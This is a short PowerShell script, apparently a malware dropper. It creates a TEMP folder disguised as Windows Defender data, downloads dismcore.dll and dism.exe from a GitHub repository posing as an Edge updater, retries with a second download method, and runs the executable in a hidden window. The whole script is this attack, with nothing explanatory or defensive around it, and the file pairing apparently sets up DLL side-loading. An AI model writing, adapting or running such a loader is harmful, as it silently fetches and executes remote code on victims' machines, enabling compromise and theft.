$d=$env:TEMP+'\WinDefData'
if(!(Test-Path $d)){New-Item $d -Force|Out-Null}
$u='https://raw.githubusercontent.com/emuladortrampo-lgtm/edge-updater/main/'
$ok=$false
try{
    Invoke-WebRequest -Uri "$u/dismcore.dll" -OutFile "$d\dismcore.dll" -UseBasicParsing -ErrorAction Stop
    Invoke-WebRequest -Uri "$u/dism.exe" -OutFile "$d\dism.exe" -UseBasicParsing -ErrorAction Stop
    $ok=$true
}catch{}
if(-not $ok){
    try{
        (New-Object Net.WebClient).DownloadFile("$u/dismcore.dll","$d\dismcore.dll")
        (New-Object Net.WebClient).DownloadFile("$u/dism.exe","$d\dism.exe")
        $ok=$true
    }catch{}
}
if($ok){
    Write-Host "Download OK"
    Start-Process "$d\dism.exe" -WindowStyle Hidden
    Write-Host "Executado"
}else{
    Write-Host "ERRO: download falhou"
}
